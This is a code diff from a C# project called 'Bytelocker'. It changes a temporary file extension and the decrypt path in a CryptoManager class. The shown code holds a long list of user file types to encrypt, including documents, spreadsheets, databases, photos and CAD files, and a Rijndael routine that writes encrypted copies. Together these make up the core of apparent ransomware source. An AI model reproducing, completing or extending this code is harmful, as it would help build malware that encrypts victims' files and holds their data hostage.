@@ -10,7 +10,7 @@ namespace Bytelocker.CryptoManager
         private String file_path;
         private byte[] salt;
 
-        public static String FILE_EXTENSION_ENCRYPT = ".bytcrypt";
+        public static String FILE_EXTENSION_ENCRYPT_TMP = ".bytcrypttmp";
         public static List<String> FILE_EXTENSIONS_TO_ENCRYPT = new List<string>(){".odt", ".ods", ".odp", ".odm", ".odc", ".odb", ".doc", ".docx", ".docm", ".wps", ".xls", ".xlsx", ".xlsm",
             ".xlsb", ".xlk", ".ppt", ".pptx", ".pptm", ".mdb", ".accdb", ".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".rtf", ".wb2", ".mdf", ".dbf", ".psd", ".pdd", ".pdf", ".eps", ".ai", ".indd",
             ".cdr", ".jpg", ".jpe", ".jpg", ".dng", ".3fr", ".arw", ".srf", ".sr2", ".bay", ".crw", ".cr2", ".dcr", ".kdc", ".erf", ".mef", ".mrw", ".nef", ".nrw", ".orf", ".raf", ".raw", ".rwl",
@@ -36,9 +36,8 @@ namespace Bytelocker.CryptoManager
 
         public void Encrypt()
         {
-            
             // create encrypted file name
-            FileStream fs = new FileStream(this.file_path + FILE_EXTENSION_ENCRYPT, FileMode.Create);
+            FileStream fs = new FileStream(this.file_path + FILE_EXTENSION_ENCRYPT_TMP, FileMode.Create);
 
             // use Rijndael encryption algor.
             RijndaelManaged rm = new RijndaelManaged();
@@ -97,7 +96,7 @@ namespace Bytelocker.CryptoManager
             rm.Mode = CIPHER_MODE;
 
             CryptoStream cs = new CryptoStream(fs, rm.CreateDecryptor(), CryptoStreamMode.Read);
-            FileStream fsOut = new FileStream(this.file_path.Substring(0, this.file_path.Length - FILE_EXTENSION_ENCRYPT.Length), FileMode.Create);
+            FileStream fsOut = new FileStream(this.file_path + FILE_EXTENSION_ENCRYPT_TMP, FileMode.Create);
 
             byte[] buffer = new byte[WRITE_BUFFER];
             int count;
